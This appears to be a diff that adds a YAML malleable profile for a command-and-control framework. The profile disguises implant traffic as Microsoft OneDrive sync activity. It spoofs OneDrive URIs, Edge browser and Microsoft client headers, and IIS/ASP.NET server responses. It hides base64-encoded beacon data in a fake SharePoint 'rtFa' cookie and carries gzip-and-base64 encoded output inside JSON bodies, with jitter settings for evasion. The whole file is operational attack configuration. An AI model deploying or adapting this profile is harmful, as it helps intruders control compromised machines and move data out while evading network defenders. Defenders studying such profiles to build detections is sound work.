@@ -1,0 +1,93 @@
+# OneDrive Malleable Profile
+# Disguises C2 traffic as Microsoft OneDrive sync activity
+
+name: "onedrive"
+description: "Microsoft OneDrive sync traffic disguise"
+
+http_get:
+  uri:
+    - "/personal/{user_id}/_layouts/15/onedrive.aspx"
+    - "/personal/{user_id}/Documents"
+    - "/personal/{user_id}/_api/web/GetFolderByServerRelativeUrl"
+  verb: "GET"
+
+  client:
+    headers:
+      Accept: "application/json"
+      Accept-Encoding: "gzip, deflate, br"
+      Accept-Language: "en-US,en;q=0.9"
+      Cache-Control: "no-cache"
+      Connection: "keep-alive"
+      Host: "{callback_host}"
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
+      X-Ms-Client-Version: "OneDriveSync; Windows 10.0.19045"
+      X-Ms-RequestId: "{random_uuid}"
+    metadata:
+      encoding:
+        - base64
+      location: "header"
+      name: "Cookie"
+      prefix: "rtFa="
+
+  server:
+    headers:
+      Cache-Control: "private, max-age=0"
+      Content-Type: "application/json; charset=utf-8"
+      Server: "Microsoft-IIS/10.0"
+      X-AspNet-Version: "4.0.30319"
+      X-Powered-By: "ASP.NET"
+      X-Ms-Diagnostics: "200"
+      X-Ms-InvokeApp: "1; RequireReadOnly"
+    output:
+      encoding:
+        - base64
+      container: "json"
+      path: "d.results[0].Data"
+
+http_post:
+  uri:
+    - "/personal/{user_id}/_api/web/GetFolderByServerRelativeUrl('/personal/{user_id}/Documents')"
+    - "/personal/{user_id}/_api/web/lists"
+  verb: "POST"
+
+  client:
+    headers:
+      Accept: "application/json; odata=verbose"
+      Content-Type: "application/json; odata=verbose"
+      X-RequestDigest: "{form_digest}"
+      X-HTTP-Method: "POST"
+    id:
+      encoding:
+        - base64
+      location: "uri"
+      parameter: "id"
+    output:
+      encoding:
+        - gzip
+        - base64
+      location: "body"
+      container: "json"
+      path: "__metadata"
+
+  server:
+    headers:
+      Content-Type: "application/json; odata=verbose"
+      Server: "Microsoft-IIS/10.0"
+    output:
+      encoding:
+        - base64
+      container: "json"
+      path: "d"
+
+# Jitter configuration
+jitter:
+  min: 30
+  max: 60
+  percent: 20
+
+# Working hours (optional)
+working_hours:
+  enabled: false
+  start: 9
+  end: 17
+  timezone: "local"
